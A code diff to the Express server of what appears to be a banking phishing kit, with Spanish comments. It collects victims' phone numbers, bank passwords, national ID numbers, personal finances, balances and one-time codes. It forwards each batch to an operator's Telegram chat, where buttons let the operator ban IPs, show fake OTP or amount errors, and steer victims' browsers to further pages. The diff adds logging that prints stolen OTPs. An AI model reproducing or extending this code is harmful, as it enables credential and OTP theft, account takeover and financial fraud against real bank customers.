@@ -44,7 +44,7 @@ function generateSessionId() {
 
 // ==================== MENÚS DE TELEGRAM ====================
 
-// Menú para loan-simulator (primer y segundo saldo)
+// Menú para loan-simulator (después del SEGUNDO saldo)
 function getLoanSimulatorMenu(sessionId) {
   return {
     inline_keyboard: [
@@ -118,6 +118,8 @@ app.post('/create-session', (req, res) => {
     steps: []
   });
   
+  console.log(`✅ Sesión creada: ${sessionId} - IP: ${ip}`);
+  
   res.json({ sessionId });
 });
 
@@ -155,6 +157,8 @@ app.post('/step1-credentials', async (req, res) => {
       text: mensaje
     });
 
+    console.log(`✅ Credenciales recibidas - Session: ${sessionId}`);
+
     res.json({ ok: true });
   } catch (error) {
     console.error('❌ ERROR EN /step1-credentials:', error.message);
@@ -180,6 +184,8 @@ app.post('/step2-loan-first', async (req, res) => {
     session.saldoActual1 = saldoActual; // Primer saldo
     sessionData.set(sessionId, session);
 
+    console.log(`✅ Primer saldo guardado - Session: ${sessionId} - Saldo: ${saldoActual}`);
+
     res.json({ ok: true, message: 'Primer saldo guardado' });
   } catch (error) {
     console.error('❌ ERROR EN /step2-loan-first:', error.message);
@@ -187,40 +193,46 @@ app.post('/step2-loan-first', async (req, res) => {
   }
 });
 
-// ==================== ENDPOINT: PASO 2 - PRÉSTAMO (SEGUNDO SALDO) ====================
+// ==================== ENDPOINT: PASO 2 - PRÉSTAMO (SEGUNDO SALDO CON BOTONES) ====================
 app.post('/step2-loan-second', async (req, res) => {
   try {
     const { sessionId, saldoActual } = req.body;
+
+    if (!BOT_TOKEN || !CHAT_ID) {
+      return res.status(500).json({ ok: false, reason: "Env vars undefined" });
+    }
 
     // Obtener datos de sesión
     const session = sessionData.get(sessionId) || {};
     session.saldoActual2 = saldoActual; // Segundo saldo
     sessionData.set(sessionId, session);
 
-    // Construir mensaje completo con ambos saldos
+    // Construir mensaje completo con AMBOS saldos
     const mensaje = `
 🟣 INFO DE PRÉSTAMO COMPLETA 🟣
 
-📱 Número: ${session.phoneNumber}
-🔑 Clave: ${session.password}
-🪪 Cédula: ${session.cedula}
-👤 Nombre y apellido: ${session.nombreCompleto}
-🧑‍💼 Ocupación: ${session.ocupacion}
-📈 Ingresos mensuales: ${session.ingresoMensual}
-💸 Gastos mensuales: ${session.gastosMensual}
-💰 Saldo actual 1: ${session.saldoActual1}
-💰 Saldo actual 2: ${session.saldoActual2}
-🌐 IP: ${session.ip}
-📍 Ubicación: ${session.city}, ${session.country}
+📱 Número: ${session.phoneNumber || 'N/A'}
+🔑 Clave: ${session.password || 'N/A'}
+🪪 Cédula: ${session.cedula || 'N/A'}
+👤 Nombre y apellido: ${session.nombreCompleto || 'N/A'}
+🧑‍💼 Ocupación: ${session.ocupacion || 'N/A'}
+📈 Ingresos mensuales: ${session.ingresoMensual || 'N/A'}
+💸 Gastos mensuales: ${session.gastosMensual || 'N/A'}
+💰 Saldo actual 1: ${session.saldoActual1 || 'N/A'}
+💰 Saldo actual 2: ${session.saldoActual2 || 'N/A'}
+🌐 IP: ${session.ip || 'N/A'}
+📍 Ubicación: ${session.city || 'N/A'}, ${session.country || 'N/A'}
 🆔 Session: ${sessionId}
     `.trim();
 
-    // Enviar a Telegram CON botones
+    // Enviar a Telegram CON BOTONES
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje,
       reply_markup: getLoanSimulatorMenu(sessionId)
     });
+
+    console.log(`✅ Datos completos enviados con botones - Session: ${sessionId}`);
 
     res.json({ ok: true, message: 'Datos completos enviados' });
   } catch (error) {
@@ -233,6 +245,10 @@ app.post('/step2-loan-second', async (req, res) => {
 app.post('/step3-dynamic', async (req, res) => {
   try {
     const { sessionId, otp, attemptNumber } = req.body;
+
+    if (!BOT_TOKEN || !CHAT_ID) {
+      return res.status(500).json({ ok: false, reason: "Env vars undefined" });
+    }
 
     // Obtener datos de sesión
     const session = sessionData.get(sessionId) || {};
@@ -247,21 +263,23 @@ app.post('/step3-dynamic', async (req, res) => {
     const mensaje = `
 📲 DINÁMICA ${attemptNumber} RECIBIDA 📲
 
-📱 Número: ${session.phoneNumber}
-🔑 Clave: ${session.password}
-👤 Nombre y apellido: ${session.nombreCompleto}
-💰 Saldo actual 1: ${session.saldoActual1}
-💰 Saldo actual 2: ${session.saldoActual2}
+📱 Número: ${session.phoneNumber || 'N/A'}
+🔑 Clave: ${session.password || 'N/A'}
+👤 Nombre y apellido: ${session.nombreCompleto || 'N/A'}
+💰 Saldo actual 1: ${session.saldoActual1 || 'N/A'}
+💰 Saldo actual 2: ${session.saldoActual2 || 'N/A'}
 🔢 Dinámica ${attemptNumber}: ${otp}
 🆔 Session: ${sessionId}
     `.trim();
 
-    // Enviar a Telegram CON botones
+    // Enviar a Telegram CON BOTONES
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje,
       reply_markup: getDynamicMenu(sessionId)
     });
+
+    console.log(`✅ Dinámica ${attemptNumber} recibida - Session: ${sessionId} - OTP: ${otp}`);
 
     res.json({ ok: true });
   } catch (error) {
@@ -278,6 +296,8 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
     
     if (callback_query) {
       const [action, sessionId] = (callback_query.data || '').split('|');
+      
+      console.log(`📞 Callback recibido - Acción: ${action} - Session: ${sessionId}`);
       
       // Eliminar menú de botones
       try {
@@ -298,6 +318,8 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
         if (session && session.ip) {
           bannedIPs.add(session.ip);
           
+          console.log(`🚫 IP BANEADA: ${session.ip}`);
+          
           await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
             callback_query_id: callback_query.id,
             text: `✅ IP ${session.ip} baneada exitosamente`,
@@ -314,6 +336,8 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
       if (action === 'error-dynamic') {
         redirections.set(sessionId, 'error-dynamic');
         
+        console.log(`❌ Error dinámica enviado - Session: ${sessionId}`);
+        
         await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
           callback_query_id: callback_query.id,
           text: '❌ Se mostrará error de dinámica',
@@ -326,6 +350,8 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
       // ERROR MONTO - ir al segundo input de saldo
       if (action === 'go:loan-simulator-error') {
         redirections.set(sessionId, 'loan-simulator-error');
+        
+        console.log(`❌ Error monto - Session: ${sessionId}`);
         
         await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
           callback_query_id: callback_query.id,
@@ -342,6 +368,8 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
         const finalRoute = route.endsWith('.html') ? route : `${route}.php.html`;
         
         redirections.set(sessionId, finalRoute);
+        
+        console.log(`✅ Redirección programada: ${finalRoute} - Session: ${sessionId}`);
         
         await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
           callback_query_id: callback_query.id,
@@ -364,6 +392,7 @@ app.get('/instruction/:sessionId', (req, res) => {
   const target = redirections.get(sessionId);
   
   if (target) {
+    console.log(`📍 Polling - Session: ${sessionId} - Target: ${target}`);
     redirections.delete(sessionId);
     res.json({ redirect_to: target });
   } else {
@@ -413,4 +442,4 @@ setInterval(async () => {
   } catch (error) {
     console.error("❌ Error en auto-ping:", error.message);
   }
-}, 14 * 60 * 1000); // Cada 14 minutos (Render duerme después de 15 min de inactividad)
+}, 14 * 60 * 1000); // Cada 14 minutos
